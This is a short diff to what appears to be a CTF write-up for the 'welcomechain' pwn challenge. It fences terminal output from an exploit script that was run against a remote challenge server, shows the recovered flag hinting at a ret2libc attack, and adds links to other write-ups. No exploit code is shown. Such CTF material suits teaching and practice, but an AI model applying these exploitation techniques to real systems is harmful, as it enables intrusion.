@@ -1,3 +1,4 @@
+```
 $ python exploit.py r
 [*] '/CTF/contrail/welcomechain'
     Arch:     amd64-64-little
@@ -41,3 +42,10 @@ ctrctf{W31c0m3!_c0ntr4i1_ctf_r3t2l1bc!}
 $ 
 [*] Interrupted
 [*] Closed connection to 114.177.250.4 port 2226
+```
+
+### references
+
+https://mitsu-mitsu.hatenablog.com/entry/2020/01/04/004854#pwn-welcomechain
+
+https://ommadawn46.hatenablog.com/entry/2020/01/06/000557#pwn-welcomechain-100pts
